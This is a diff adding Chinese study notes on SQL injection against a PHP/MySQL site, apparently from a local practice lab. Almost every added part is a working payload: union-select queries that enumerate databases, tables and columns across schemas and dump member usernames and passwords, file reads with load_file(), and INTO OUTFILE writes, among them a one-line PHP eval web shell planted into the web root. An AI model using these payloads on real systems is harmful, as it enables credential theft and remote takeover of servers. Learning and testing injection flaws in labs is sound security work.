@@ -183,3 +183,75 @@ union select 1,2,3,username,password,6 from admin limit 0,1
 ![image-20251205213838166](images/image-20251205213838166.png)
 
 ![image-20251205213850081](images/image-20251205213850081.png)
+
+# :sassy_man:跨库查询
+
+每个网站都是由root账户管里  ==本案例适用于数据库统一管理==
+
+```
+union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata
+```
+
+![image-20251206195419820](images/image-20251206195419820.png)
+
+```
+id=1 union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='sert'
+```
+
+![image-20251206200009907](images/image-20251206200009907.png)
+
+```
+union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='zbp_member' and table_schema='sert'
+```
+
+<img src="images/image-20251206200133194.png" alt="image-20251206200133194" style="zoom:150%;" />
+
+```
+union select 1,2,3,mem_Name,mem_Password,6 from sert.zbp_member
+```
+
+![image-20251206202107676](images/image-20251206202107676.png)
+
+# :currency_exchange:PHP-MYSQL-SQL文件读写
+
+在`mysql` 文件 `my.ini `  控制可访问路径       当前状态为可以访问全部路径
+
+![image-20251206215331371](images/image-20251206215331371.png)
+
+双`\`转义
+
+![image-20251206231603831](images/image-20251206231603831.png)
+
+```
+union select 1,2,3,load_file('d:\\1.txt'),5,6        //文件的读取
+```
+
+![image-20251206232048201](images/image-20251206232048201.png)
+
+```
+ union select 1,'wwww',3,4,5,6 into outfile 'd:\\2.txt'   //写入文件
+```
+
+![image-20251206232441432](images/image-20251206232441432.png)
+
+==写入后门代码==                
+
+```
+union select 1,2,3,'<?php eval($_POST[x]);?>',5,6 into outfile 'E:\\phpstudy_pro\\WWW\\demo02\\2.php'
+```
+
+==无杂项版本==
+
+```
+UNION SELECT 
+'', '', '', '<?php eval($_POST[x]);?>', '', ''
+INTO OUTFILE 'E:\\phpstudy_pro\\WWW\\demo02\\2.php'
+```
+
+load_file()的使用 可以在百度上搜索
+
+load_file()常用路径
+
+网站报错
+
+phpinfo 爆出路径
